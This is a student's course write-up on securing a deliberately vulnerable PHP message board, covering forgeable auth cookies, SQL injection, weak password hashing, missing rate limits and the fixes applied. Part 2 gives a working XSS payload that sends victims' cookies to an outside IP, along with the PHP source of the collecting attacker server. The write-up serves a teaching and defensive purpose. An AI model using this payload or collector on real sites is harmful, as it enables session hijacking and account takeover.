# Project Writeup

Bradley Rosenfeld - COS342, 11/14/15

## Part 1.

Overall this application was extremely vulnerable to all sorts of different attacks. Malicious users could run arbitrary SQL queries as well as insert XSS attacks into posts. I outlined below my response to the specific security policies laid out in the assignment.

1. The application tries to prevent access to messages by checking for the existence of a cookie that is created when the user is authenticated and logged in. Messages can be deleted by visiting a GET URL, the link to which is only visible when the user who is viewing the message has a cookie that matches the user who created the message. 

 Unfortunately, these security policies are not adequate to prevent unauthorized access. Malicious users can easily create a cookie called "hackme" which contains the username which they wish to target. Once this cookie has been created, they can view messages and perform actions that only the real user should be able to do. The original system could be hacked without ever requiring the malicious actor to crack the user's password.

 The message deletion action doesn't check to see if the user is authorized, anyone can enter an arbitrary message ID which they wish to delete. Even worse, the deletion action is vulnerable to SQL injection which would allow any user to delete any post or perform other operations on the database.

 In order to fix this I implemented PHP sessions. Rather than sending the actual username and password as a cookie, a unique session ID is set which an attacker wouldn't be able to guess (they could snoop for it, but that is addressed later). The application then checks for the existence of the session ID and makes sure it is valid. Similarly, the deletion action will check to make sure the user is actually authorized and that the ID provided is valid. To prevent SQL injection, I escape all values that are inserted into SQL queries.

2. The database only contains password hashes, so the raw passwords can't be accessed immediately. But the passwords are hashed with a weak algorithm (SHA1) and they are not salted resulting in duplication of hashes. This results in an illusion of security, when in reality the hashes could be cracked within minutes.

 I fixed this by moving to a newer PHP function `password_hash()` which uses a much strong hashing function (bcrypt), handles salting, and enforces a "cost" which slows down direct brute force attacks on the server.

3. Attackers can easily snoop for user credentials for multiple reasons. Since the site is not HTTPS, usernames and passwords are sent via plaintext over the network. Furthermore, the username and hashed password are stored in cookies which are sent with every network request. It would be trivial to snoop for credentials.

 To fully fix this, I would need to enable HTTPS. But I did stop saving the username and password in a cookie. Instead I use a unique PHP session ID for further authentication.

4. Login attempts are not rate limited, making brute force attacks trivial.
 
 I fixed this by slowing down the number of attempts allowed per minute on a user. Once the user has exceeded 5 attempts, they have to wait a minute before trying again. If the attacker ever has direct access to the database, the password hash is resistant to brute force attacks through the use of a salt and an enforced computation time. 

5. No password scheme was implemented, users could submit anything as a password.
 
 I implemented a password policy that says passwords must be at least 8 characters long, aren't dictionary words, and don't have too many letters, numbers, or special characters (must be a combination). This policy is enforced by my PHP Password class in the check() method.


I also solved a lot of the possible SQL injection attacks on the website by using `mysqli_real_escape_string()`. This function automatically escapes quotes and other special characters preventing attackers from running their own commands.

## Part 2

The attacker could post an image that fails to load, forcing JS to run. In this case, I wrote a simple script that sends the user's cookie to the remote server.

```
<img src="fdfjkdfjfkjdfdf.dfdjf" onerror="this.src=\'http://10.121.20.103/hackme-xss.php?c=\' + document.cookie">
```

You can view the result of this attack by visiting [10.121.20.103/hackme-xss.php](http://10.121.20.103/hackme-xss.php)

In order to fix this, I disabled all usage of HTML in messages by using the `htmlspecialchars()` function in PHP when rendering the user submitted content.

The source code of the attacker server is as follows:

```
<?php
$secretFile = "/tmp/foo.txt";
if (isset($_GET['c'])) {
        $fh = fopen($secretFile, 'a') or die("can’t open file");
        $stringData = $_GET['c']."\n";
        fwrite($fh, $stringData);
        fclose($fh);

        //Send an img
        header('Content-Type: image/jpeg');
        readfile("kitten.jpg");
} else {
        header("Content-Type: text/plain");
        readfile($secretFile);
}
?>
```

